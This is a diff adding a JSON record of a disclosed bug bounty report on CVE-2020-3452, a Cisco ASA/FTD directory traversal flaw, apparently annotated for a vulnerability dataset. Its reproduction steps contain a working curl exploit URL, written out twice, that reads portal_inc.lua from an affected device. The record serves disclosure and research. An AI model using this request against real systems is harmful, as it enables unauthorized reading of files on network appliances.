@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "moon_shadow ",
+  "title": "https://\u2588\u2588\u2588\u2588 is vulnerable to cve-2020-3452",
+  "content": "\nDescription:\nA vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.\n## Impact\nStep-by-step Reproduction Instructions\nto reproduce run the below curl command, and you will see the content of portal_inc.lua\ncurl -ik 'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'\nImpact\nA successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1620778680,
+  "report_url": "https://hackerone.com/reports/998925",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Run the curl command: `curl -ik 'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'`"
+    ],
+    [
+      2,
+      "Observe the content of `portal_inc.lua` in the response"
+    ]
+  ],
+  "vuln_description": "A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software allows an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system. The vulnerability is due to a lack of proper input validation of URLs in HTTP requests processed by an affected device.",
+  "reason": "The attack involves a single, straightforward HTTP request with a crafted URL containing directory traversal sequences. There are no complex interactions or state manipulations required, and the vulnerability is well-documented (CVE-2020-3452).",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
